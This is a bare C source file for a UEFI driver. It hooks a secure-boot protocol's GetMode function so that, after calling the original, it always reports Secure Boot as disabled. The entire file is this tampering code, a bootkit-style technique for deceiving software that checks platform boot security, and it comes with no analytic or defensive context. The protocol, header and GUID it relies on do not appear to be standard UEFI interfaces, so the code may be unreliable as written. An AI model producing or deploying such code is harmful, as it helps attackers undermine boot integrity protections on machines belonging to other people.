#include <Uefi.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Protocol/SecureBoot.h>

EFI_SECURE_BOOT_PROTOCOL *gSecureBoot = NULL;
EFI_STATUS (EFIAPI *OriginalGetMode)(EFI_SECURE_BOOT_PROTOCOL *This, BOOLEAN *SecureBootEnabled) = NULL;

EFI_STATUS EFIAPI HookedGetMode(EFI_SECURE_BOOT_PROTOCOL *This, BOOLEAN *SecureBootEnabled) {
    EFI_STATUS Status = OriginalGetMode(This, SecureBootEnabled);
    if (!EFI_ERROR(Status)) *SecureBootEnabled = FALSE;
    return Status;
}

EFI_STATUS EFIAPI UefiDriverEntryPoint(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {
    EFI_STATUS Status = gBS->LocateProtocol(&gEfiSecureBootProtocolGuid, NULL, (VOID**)&gSecureBoot);
    if (EFI_ERROR(Status)) return Status;

    OriginalGetMode = gSecureBoot->GetMode;
    gSecureBoot->GetMode = HookedGetMode;

    return EFI_SUCCESS;
}
